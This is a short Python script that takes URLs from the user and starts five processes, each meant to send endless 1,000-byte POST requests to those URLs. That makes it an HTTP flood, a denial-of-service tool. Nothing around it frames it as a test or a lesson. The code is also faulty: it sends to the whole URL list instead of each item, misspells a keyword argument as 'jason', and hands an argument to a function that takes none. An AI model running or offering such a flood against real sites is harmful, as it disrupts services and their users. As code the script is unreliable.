import requests as res
import multiprocessing

vector = input("url:\n").split(" ")
bye = bytes(10**3)

def http():
    while True:
        for i in vector:
            response = res.post(vector, data=bye, jason=None)
            print(response.text)
            
print("using post method to: ", vector)

processes = []

for i in range(5):
    p = multiprocessing.Process(target=http, args=(i,))
    processes.append(p)
    p.start()

# Wait for all processes to complete
for p in processes:
    p.join()
